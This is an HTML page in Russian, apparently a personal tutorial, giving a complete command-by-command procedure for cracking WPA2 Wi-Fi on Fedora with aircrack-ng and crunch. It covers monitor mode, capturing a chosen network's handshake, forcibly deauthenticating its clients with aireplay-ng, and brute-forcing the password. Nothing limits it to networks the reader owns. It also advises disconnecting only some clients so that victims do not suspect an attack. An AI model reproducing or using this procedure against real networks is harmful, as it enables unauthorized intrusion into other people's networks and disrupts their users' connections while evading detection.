<!DOCTYPE html>
<html>
<head>
	<title>Взлом Wi-Fi сети шифрование WPA2 Linux Fedora 42</title>

	<meta name="DESCRIPTION" content="Взлом Wi-Fi сети шифрование WPA2 Linux Fedora 42">
	<meta name="KEYWORDS" content="Взлом Wi-Fi сети шифрование WPA2 Linux Fedora 42">

	<meta property="og:url"                content="https://kurlyak.ho.ua/08.001-pen-test-wifi1/pen-test-wifi1.html" />
	<meta property="og:type"               content="article" />
	<meta property="og:title"              content="Ed Kurlyak - Взлом Wi-Fi сети" />
	<meta property="og:description"        content="Взлом Wi-Fi сети шифрование WPA2 Linux Fedora 42" />
	<meta property="og:image"              content="https://kurlyak.ho.ua/08.001-pen-test-wifi1/wifi.jpg" />


<style type="text/css">
body {
	font-size: 24px;
	font-family: "Consolas";
	background-color: #000;
	color: #ffffff;
}

pre {
	font-size: 24px;
	font-family: "Consolas";
	background-color: #ffffaa;
	color: #000;
	width: max-content;
	min-width: 100%;

}

div.my_selected {
	width: 100%;
	background-color: #ffff55;
	position: relative;
}

a:link, a:visited { color: #aaaaaa; text-decoration: none; font-weight: normal;} 
a:active, a:hover { color: #aaaaaa; text-decoration: underline;}

p {
	text-align: justify;
	margin-right: 20px;
}

</style>	
</head>
<body>

<h3>
Взлом Wi-Fi сети шифрование WPA2 Linux Fedora 42
</h3>

<p>
Если ваш сетевой адаптер Wi-Fi не поддерживает режим monitor - эта статья вам ничем не поможет, вам необходимо преобрести Wi-Fi сетевой адаптер с поддержкой режима monitor. Например у меня в ноутбуке стоит Qualcomm Atheros AR9287 Wireless Network Apapter (PCI-Express) (rev 01) это отличный адаптер для прослушки Wi-Fi сети, работает без проблем, его можно перевести в режим monitor.
</p>

<p>
Для экспериментов по взлому Wi-Fi сети необходимо иметь установленный Linux Fedora 42, так же все показанно здесь можно перенести на другую версию Linux.
</p>

<p>
Мы будем использовать две программы: aircrack-ng и crunch.
</p>

<p>
Установка aircrack-ng (инструмент для взлома Wi-Fi) на Linux Fedora 42.
</p>

<p>
Запустить терминал Fedora Linux ввести команду (репозитории устанавливать не надо,
например RPM Fusion для установки aircrack-ng не надо):
</p>

<p>
yum search aircrack-ng
</p>

<p>
Терминал выдаст информацию в терминал о всех aircrack-ng которые нашло.
</p>

<p>
Далее установить aircrack-ng команда терминала:
</p>

<p>
yum install aircrack-ng
</p>

<p>
Установка aircrack-ng выполнена.
</p>

<p>
Установка crunch (генератор паролей).
</p>

<p>
Снала установить RPM Fusion дополнительный репозиторий Fedora Linux. Наберите в Google поиск строке:
</p>

<p>
rpm fusion
</p>

<p>
В результатах поиска Google найдите ссылку как на скриншоте ниже:
</p>

<img src="./rpm_fusion_google.jpg" width=800>

<p>
Далее следуте инструкциям по этой ссылке, и подключите у себя в ОС Fedora 42 репозиторий RPM Fusion. Без него не установятся некоторые программы.
</p>

<p>
Далее в поисковой системе (например Google) ввести поисковый запрос:
</p>

<p>
crunch password generator
</p>

<p>
В результатах выдачи Google найти ссылку на SourceForge.net - это безопасная загрузка без вирусов.
</p>

<p>
На странице crunch SourceForge.net ищем ссылку Files и переходим и на этой странице жмем Download Latest Version.
</p>

<p>
Из SourceForge.net скачали архив crunch-3.6.tgz.
</p>

<p>
Правой кнопкой мыши на архиве crunch-3.6.tgz и в меню нажать Extract To распаковать архив.
</p>

<p>
Распаковали архив и переходим в папку crunch-3.6 (команда консоли дальше):
</p>

<p>
cd /home/black4joss/Downloads/crunch-3.6
</p>

<p>
Перешли в папку crunch-3.6 даем команду ls и видим Makefile значит можем дать команду make в терминале.
</p>

<p>
Далее мы будем устанавливать необходимые инструменты для компиляции программы crunch. Выполните две команды одна после другой на установку необходимых пакетов:
</p>

<p>
dnf install gcc make -y
</p>

<p>
dnf install gcc-c++ glibc-devel -y
</p>

<p>
Необходимые пакеты установлены даем команду на сборку crunch (даем команду make в терминале):
</p>

<p>
make
</p>

<p>
После этой команды могут быть предупреждения компилятора о несоответствиях, но это всего лишь предупреждения а не ошибки.
</p>

<p>
make install
</p>

<p>
Установка crunch выполнена.
</p>

<p>
Документация по командам crunch команда ниже в терминале:
</p>

<p>
man crunch 
</p>

<p>
Сама команда создать пароли задается так:
</p>

<p>
crunch min_len max_len options
</p>

<p>
Например, Вот команда для crunch, которая будет генерировать пароли длинной от 4 до 10 символов, состоящие только из цифр и английских букв в нижнем регистре:
</p>

<p>
crunch 4 10 abcdefghijklmnopqrstuvwxyz0123456789
</p>

<p>
Подготовка к взлому Wi-Fi.
</p>

<p>
Переходим на права суперпользователя, даем команду:
</p>

<p>
sudo passwd root
</p>

<p>
Попросит установить новый пароль для root - устанавливаем. Этот шаг можно пропустить у кого уже есть root пароль.
</p>

<p>
Переходим на root пользователя, команда:
</p>

<p>
su
</p>

<p>
Вводим пароль root.
</p>

<p>
Чтобы узнать, поддерживает ли наш интерфейс wlp3s0 режим мониторинга в Fedora 42, используется команда:
</p>

<p>
iw list
</p>

<p>
Затем надо найти раздел:
</p>

<pre>

Supported interface modes:
	* IBSS
	* managed
	* AP
	* monitor

</pre>

<p>
Если * monitor есть в списке — значит, аппарат и драйвер поддерживают режим мониторинга.
</p>

<p>
Быстрая проверка через grep:
</p>

<p>
iw list | grep -A 10 "Supported interface modes"
</p>

<p>
Сначала необходимо посмотреть список всех доступных адаптеров которые у вас есть в системе, даем команду:
</p>

<p>
ifconfig
</p>

<p>
В результате этой команды увидим все доступные сетевые интерфейсы. Мой Wi-Fi адаптер называется wlp3s0. Это имя я буду использовать в дальнейшем.
</p>

<p>
Смотрим в каком режиме находится наш адаптер wlp3s0 (команда терминала ниже):
</p>

<p>
iw dev
</p>

<p>
Увидим:
</p>

<pre>

Interface wlp3s0
    type managed

</pre>

<p>
Что значит интерфейс не в режиме montor - переводим его в режим monitor, но сначала надо дать команду:
</p>

<p>
airmon-ng check kill
</p>

<p>
Команда убивает фоновые процессы, которые мешают корректной работе Wi-Fi адаптера в режиме мониторинга.
</p>

<p>
Проверяем что нету больше процессов после выполнения последней команды:
</p>

<p>
airmon-ng check wlp3s0
</p>

<p>
Теперь переводим Wi-Fi адаптер в режим monitor (первый способ):
</p>

<p>
airmon-ng start wlp3s0
</p>

<p>
После выполнения последней команды наше устройство wlp3s0 теперь назыается wlp3s0mon - что значит устройство работает в режиме monitor.
</p>

<p>
Еще один способ перевести адаптер в режим monitor (второй способ), возможно будет лучше у вас работать:
</p>

<p>ip link set wlp3s0 down</p>
<p>iw dev wlp3s0 set type monitor</p>
<p>ip link set wlp3s0 up</p>

<p>
После этих команд имя устройства не меняется, остается прежним wlp3s0 (без приставки mon).
</p>

<p>
Проверяем что устройство работает в режиме monitor:
</p>

<p>
iw dev
</p>

<p>
Вывод на экран:
</p>

<pre>

Interface wlp3s0
    type monitor

</pre>

<p>
Переходим непосредственно ко взлому Wi-Fi сети.
</p>

<p>
Открываем окно терминала и даем команду на прослушивание всего трафика Wi-Fi который вокруг:
</p>

<p>
Если вы в режим monitor переходили первым способом:
</p>

<p>
airodump-ng wlp3s0mon
</p>

<p>
Если вы в режим monitor переходили вторым способом:
</p>

<p>
airodump-ng wlp3s0
</p>


<p>
У вас на экране будет таблица- список всех доступных Wi-Fi сетей, где ESSID колонка - это имя сети, BSSID это мак адрес Wi-Fi роутера который распространяет эту сеть, CH это канал на котором работает сеть. Из этой таблицы запоминаем номер канала CH на котором работает нужная нам сеть, и ее BSSID. Внизу под первой таблицей есть вторая таблица - мак адрес точки доступа колонка BSSID и колонка STATION - это клиенты которые подключены к сети, мак адреса клиентов.
</p>

<p>
Далее лучше всего открыть сразу три терминала с правами root для каждой команды.
</p>

<p>
Теперь мы перевели адаптер в режим монитора, и все что нам нужно, наблюдать за одной сетью, что бы словить ее 4 way handshake (четырехстороннее рукопожатие) - в нем будет пароль от Wi-Fi сети.
</p>

<p>
Из вывода предыдущей команды у нас есть мак адрес точки доступа, ее канал и имя.
</p>

<p>
Первый терминал - выбрали конкретную точку доступа и следим за ее клиентами:
</p>

<p>
airodump-ng -c 9 -w my_scan --bssid 58:D5:6E:A0:06:95 wlp3s0mon
</p>

<p>
Или 
</p>

<p>
airodump-ng -c 9 -w my_scan --bssid 58:D5:6E:A0:06:95 wlp3s0
</p>

<p>
Где ключ -c 9 значит точка доступа работает на 9 канале, далее --bssid 58:D5:6E:A0:06:95 это мак адрес точки доступа, -w my_scan лог файл куда мы запишем четырехстороннее рукопожатие с паролем от данной сети.
</p>

<p>
Открываем следующий второй терминал - ждем когда клиент будет в сети готовим команду отключать клиента (или клиентов). Это командой мы выбросим клиентов из сети, их устройства автоматически переподключатся к сети, и в этот момент (переподключение) мы словим четырехсторонее рукопожатие. Второй терминал приготовили команду отключать клиентов, вводим в командную строку но не нажимаем Enter:
</p>

<p>
aireplay-ng --ignore-negative-one -0 0 -a 58:D5:6E:A0:06:95 wlp3s0mon
</p>

<p>
Или
</p>

<p>
aireplay-ng --ignore-negative-one -0 0 -a 58:D5:6E:A0:06:95 wlp3s0
</p>

<p>
Если у вас эта команда запуститься без ключа --ignore-negative-one это будет просто олично! 
</p>

<p>
Ключ -0 0 обозначает отключить всех клиентов (значение ноль), мы можем указать например отключить от сети 5 клиентов -0 5, а не всех, что бы не вызывать подозрения. Например, один клиент был отключен, смотрит- о рядом Wi-Fi у человека работает, значит что то у меня, и на взлом сети никаких подозрений не будет.
</p>

<p>
Третий терминал команда следить за логом, есть ли четырехстороннее рукопожатие, открываем третий терминал и вводим команду (запускаем на выполнение):
</p>

<p>
watch -n 1 "aircrack-ng my_scan-01.cap | grep handshake"
</p>

<p>
Эта команда каждую 1 секудну просматривает лог my_scan-01.cap в поисках строки handshake и если строка найдена выводит ее на экран.
</p>

<p>
Далее переходим в окно первого терминала, смотрим в сети есть клиенты, начинаем их отключать от точки доступа - во втором окне терминала запускаем (нажимаем Enter) на приготовленной команде. 
</p>

<p>
После того как вы запустили команду во втором терминале началось отключение клиентов, надо подождать 1, максимум 2 минуты. Когда работает команда во втором терминале мы переключаемся в третий - где вывод на экран файла лога если ли в нем handshake. Если вывод на экран в третьем терминале показал что есть handshake - нажимаем Ctrl+C во всех трех терминалах - работа закончена, далее идет процесс подбора пароля из лог файла. Но бывает что после 1-2 минут во втором терминале надо нажать Ctrl+C что бы прервать отключение клиентов от сети, и только после этого они переподключаются и в лог файл запишется четырехстороннее рукопожатие.
</p>

<p>
Так же можно вручную в терминале проверить есть ли 4 way handshake в лог файле:
</p>

<p>
aircrack-ng my_scan-01.cap
</p>

<p>
В выводе мы увидим список сетей (ESSID), и если рядом с нужной сетью будет вот так:
</p>

<p>
[ WPA handshake: 58:D5:6E:A0:06:95 ]
</p>

<p>
Значит, handshake есть, и файл готов к подбору пароля.
</p>

<p>
Заходим в папку root где файл my_scan и даем команду подбора пароля в терминале:
</p>

<p>
crunch 4 10 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - my_scan-01.cap -e MyWiFi
</p>

<p>
Где ключ -e MyWiFi это имя сети для которого будет происходить подбор пароля. В команде crunch можно гибко задавать параметры для подбора пароля, ознакомтесь с документацией. Здесь команда aircrack-ng берет сгенерированные пароли из стандартного вывода, а на стандартный вывод пароли направляет crunch.
</p>

</body>
</html>
